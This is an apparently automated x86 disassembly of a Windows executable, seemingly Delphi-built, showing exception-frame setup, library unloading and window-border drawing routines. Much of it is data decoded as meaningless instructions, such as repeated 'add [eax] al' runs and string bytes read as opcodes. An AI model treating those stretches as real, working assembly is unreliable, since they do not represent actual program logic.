retn
sub_42af1b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42af60
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af67
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404acc
sub_42af83
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42afc8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42afcf
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404acc
sub_42afdf
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b035
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b03c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_404050
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42b048
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b08c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b093
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42b0a0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b0c5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b0cc
retn
sub_42b0d8
and al 0xb1
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi * 4 ] ch
inc edx
add [ eax + eax ] al
add [ eax ] al
mov eax 0xc4004010
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi - 0x4e4fffc0 ] al
inc edx
add ah al
mov cl 0x42
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
jb r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
nop
push sub_42b247
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b24e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a80
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a80
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42b1d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42b247
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b24e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a80
mov eax rw-data
mov edx [ r-xdata ]
call sub_404a80
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_42b4a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_4262c0
mov [ esi + 0x5 ] al
call sub_42b178
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_42bbfc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42b4ec
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_42b58c
call sub_426100
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42b520
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_42b58c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_42b5d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42b520
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_42b61c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_42b520
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42b660
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_42b520
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_42b6c8
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_42b704
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42b721 ]
jmp [ eax * 4 + jump_table_42b78a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42ba90
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42bbeb
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_42b6c8
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_42b61c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43df6c
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412d08
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_42bc18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bc53
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bc5a
retn
mov eax [ rw-data ]
call sub_403294
mov eax rw-data
call sub_404050
sub_42bfbb
add [ eax - 0x63ffbd09 ] dl
test [ edx ] sub_42f828
sub eax 0xec480044
inc edx
add [ eax + 0x780042f6 ] dh
out dx eax
inc edx
add [ eax - 0x6fffbfd6 ] dl
sub al [ eax ]
jl r-xdata
inc edx
add [ eax + 0x6000402a ] dl
clc
inc edx
add [ edi + esi * 8 + 0x42 ] ch
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb3008700
push [ edx - 0x4f004e01 ]
push [ ebp + 0x42ed8cff ]
add ah ch
in eax dx
inc edx
add [ eax ] al
out dx al
inc edx
add [ ebx + esi * 8 + 0x42 ] ah
add [ eax - 0x47ffbd13 ] dh
in eax dx
inc edx
add al al
in eax dx
inc edx
add al cl
in eax dx
inc edx
add al dl
hlt
sub_42c110
xchg esp eax
add al [ eax ]
add [ esi + edi * 4 - 0x4f4bffbe ] dl
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx + edi * 8 + 0x42 ] al
add [ eax - 0x16 ] al
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add al dl
cmc
inc edx
add [ esp + ebp * 2 + 0x43 ] bh
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add al al
clc
inc edx
add [ ebp + 0x43 ] dl
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
inc edx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
push esp
clc
inc edx
add ah dl
in al dx
inc edx
add [ eax ] al
in eax dx
inc edx
add [ eax - 0x8 ] ch
inc edx
add al bh
jmp r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + 0x4 ] ah
inc ebx
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bh
stc
inc edx
add ah dh
mov al 0x43
add [ edx + edi * 8 + 0x42 ] bl
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ esp + ebp * 8 ] ah
inc edx
add [ ebx + edi * 8 - 0x207fffbe ] bl
inc ebx
add [ eax - 0x43 ] dl
inc ebx
add [ eax ] dl
int1
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x2700040 ] ch
add [ eax ] al
or [ eax ] al
adc al 0x0
or [ eax - 0x43d343d5 ] esi
add [ edx ] eax
sldt [ ebx - 0x13004600 ]
sti
inc edx
add [ esi + ebp * 8 ] ah
inc edx
add ah ah
add al [ ebx ]
mov esp 0xe8004303
add eax [ ebx ]
mov esp 0xf4004304
push es
inc ebx
add [ edi * 8 + 0x540f0042 ] dh
inc ebx
jne r-xdata
in al 0xba
inc ebx
add [ edx + esi ] ch
je r-xdata
inc edx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
push esp
clc
inc edx
add ah dl
in al dx
inc edx
add [ eax ] al
in eax dx
inc edx
add [ eax - 0x8 ] ch
inc edx
add al bh
jmp r-xdata
add [ eax + 0x78 ] al
inc ebx
add [ eax + 0x4 ] ah
inc ebx
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bh
stc
inc edx
add ah dh
mov al 0x43
add [ edx + edi * 8 + 0x42 ] bl
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ esp + ebp * 8 ] ah
inc edx
add [ ebx + edi * 8 - 0x207fffbe ] bl
inc ebx
add [ eax - 0x43 ] dl
inc ebx
add [ eax ] dl
int1
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ecx + edi * 8 + 0x42 ] al
add [ eax - 0x16 ] al
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add al dl
cmc
inc edx
add [ esp + ebp * 2 + 0x43 ] bh
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add al al
clc
inc edx
add [ ebp + 0x43 ] dl
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
inc eax
add ah ah
mov edx 0x322c0043
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
retn 0x42
ror [ esp + eax * 8 + 0x42 ] 0x0
pop es
or [ ebx + eax * 2 + 0x6f ] edx
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or eax [ eax ]
or al 0x41
jne r-xdata
retn
insb
outsd
inc ebx
outsd
insd
jo r-xdata
mov al 0xec
inc ebx
add [ ecx ] al
cmp al [ ebx ]
arpl [ ecx ] ax
add bh bh
cmp al 0xec
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
jbe r-xdata
je r-xdata
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
add [ eax ] al
adc al [ eax ]
add eax 0x6c797453
cwde
sub eax [ ebx ]
popad
add [ eax ] al
inc [ eax ]
imul eax [ ebx ] 0xffffff9c
imul eax [ ebx ] 0x0
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
insb
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebp
jae r-xdata
insb
push cs
add [ edx ] cl
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
sbb al 0x14
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + 0x65 ] eax
jbe r-xdata
cmp al [ ebx ]
add [ gs : eax ] eax
push [ eax + 0x10043ec ]
inc esp
imul ecx [ ebp + 0x6f ] 0xbc646564
inc edx
add [ edx + eax ] dh
jmp [ edi + ebp * 8 + 0x42 ]
insb
dec edi
jne r-xdata
dec ecx
outsb
outsb
outsd
inc esp
jb r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
push esp
jb r-xdata
add dh bh
sar [ eax + 0x43 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6465646f
mov esp 0x2740042
add bh bh
out dx eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jb r-xdata
jo r-xdata
add bh bh
mov [ ecx ] al
inc ebx
outsd
jne r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x5300ffff ] ah
popad
jae r-xdata
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
add [ eax ] al
rol [ edx ] 0x76
add al [ eax ]
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
ja r-xdata
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40105474
add ah cl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
push esp
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
je r-xdata
add [ eax ] al
inc [ ecx ]
add al dl
loopne r-xdata
inc esp
pop eax
and al 0x43
js r-xdata
jb r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410b00
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
push [ eax ]
inc ecx
add [ eax ] dh
add bh bh
dec esp
jns r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
insb
inc ebx
insb
outsd
jae r-xdata
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
push [ eax + 0x79 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x61500b00
jb r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
or [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] al
sbb al 0x0
or eax 0x706f7244
inc esp
outsd
ja r-xdata
push esp
add [ edx ] bh
add bh bh
jpe r-xdata
xor eax [ eax + ebx * 2 + 0x24 ]
inc ebx
jae r-xdata
loopne r-xdata
lodsb [ esi ]
add [ eax + 0x79 ] ch
inc ebx
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ ecx ] cl
inc edx
jbe r-xdata
push ebp
jo r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
jmp [ eax + 0x10043e1 ]
imul ebp [ esi + 0x74 ] r-xdata
jne r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
je r-xdata
inc ebx
sub al 0x43
add [ eax + eax ] dh
[ eax - 0x64 ]
inc ebx
add [ ecx ] al
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
or al 0x41
jne r-xdata
cmp al [ ebx ]
bound eax [ ecx ]
add bh bh
sub ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
cmp cl 0x42
add [ ecx ] al
add bh bh
loope r-xdata
jo r-xdata
adc [ eax ] al
0x20ff0000 0x4379
push cs
push eax
popad
jb r-xdata
je r-xdata
add [ eax ] al
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
push eax
popad
jb r-xdata
outsd
insb
outsd
jb r-xdata
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
sub al [ ebx ]
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x64656c62
adc eax 0x2180041
sub [ fs : ebx ] ch
inc ebx
add [ eax ] cl
loope r-xdata
cwde
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc ebx
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
fdivr [ eax + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
